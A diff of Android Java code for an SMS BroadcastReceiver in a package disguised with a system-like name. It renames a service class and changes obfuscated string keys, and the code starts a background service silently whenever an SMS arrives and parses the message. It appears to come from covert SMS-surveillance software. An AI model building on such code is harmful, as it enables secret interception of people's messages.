@@ -17,7 +17,7 @@ import android.telephony.SmsMessage;
 
 import com.android.networking.Core;
 import com.android.networking.Messages;
-import com.android.networking.ServiceCore;
+import com.android.networking.ServiceMain;
 import com.android.networking.auto.Cfg;
 import com.android.networking.module.message.Sms;
 import com.android.networking.util.Check;
@@ -29,9 +29,9 @@ public class BSm extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		if (Core.isServiceRunning() == false) {
-			Intent serviceIntent = new Intent(context, ServiceCore.class);
+			Intent serviceIntent = new Intent(context, ServiceMain.class);
 			
-		    //serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
+		    //serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
 		    context.startService(serviceIntent);
 			
 		    if (Cfg.DEBUG) {
@@ -63,7 +63,7 @@ public class BSm extends BroadcastReceiver {
 
 		// Prendiamo l'sms
 		// 26.0 = pdus
-		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26.0")); //$NON-NLS-1$
+		final Object[] pdus = (Object[]) bundle.get(Messages.getString("26_0")); //$NON-NLS-1$
 		msgs = new SmsMessage[pdus.length];
 
 		for (int i = 0; i < msgs.length; i++) {
